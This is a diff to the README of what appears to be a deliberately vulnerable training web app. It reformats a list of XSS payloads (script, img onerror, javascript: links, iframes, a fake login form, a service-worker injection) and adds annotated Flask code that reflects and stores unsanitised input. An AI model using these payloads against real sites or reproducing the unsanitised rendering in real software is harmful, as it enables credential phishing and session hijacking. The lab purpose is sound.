@@ -19,21 +19,16 @@ Please see the documentation: https://www.postgresql.org/docs/current/tutorial-i
 * перенести в env основные конфигурационные настройки
 
 # Vulnerabilities 
-### XSS + Iframe injection
-
+1. XSS
+Exploits:
 ```html
-http://localhost:8888/xss?param=<script>alert(1)</script>
-
-<img src=https://stackoverflow.com/ onerror=alert(1)>
-
-<script>alert(document.domain)</script>
-
-<a href="javascript:alert(document.domain);">click here</a>
-
-<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
-
-<iframe src="http://httpforever.com/></iframe>
-
+1. GET injection: http://{URL}/xss?param=<script>alert(1)</script>
+2. HTML img injection: <img src=https://stackoverflow.com/ onerror=alert(1)>
+3. JS  injection: <script>alert(document.domain)</script>
+4. HTML tag injection: <a href="javascript:alert(document.domain);">click here</a>
+5. Iframe injection: <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+6. Iframe injection:<iframe src="http://httpforever.com/></iframe>
+7. Form injection:
 <form name="login" action="http://ip: port/">
  	<label for="login">login: </label>
  	<input type="text" name="login" required>
@@ -43,7 +38,7 @@ http://localhost:8888/xss?param=<script>alert(1)</script>
  	<br>
  	<input type="submit" value="Login!">
  </form>
-
+8. Service worket injection:
 <script>
 window.addEventListener('load', function() {
     var sw = "/sw.js";
@@ -56,6 +51,13 @@ window.addEventListener('load', function() {
         });
 });
 </script>
+```
+
+Vulnerable code:
+```modules/xss.py
+user_input = request.args.get('param') #<-- точка ввода через query параметры xss reflected + SSTI  
+return render_template('xss.html', user_input=user_input) #<-- небезопасный вывод пользователю данных без санитизации
+data = request.form['user_input'] #<-- точка пользовательского ввода без валидации xss stored
 ```
 
 # PATH TRAVERSAL
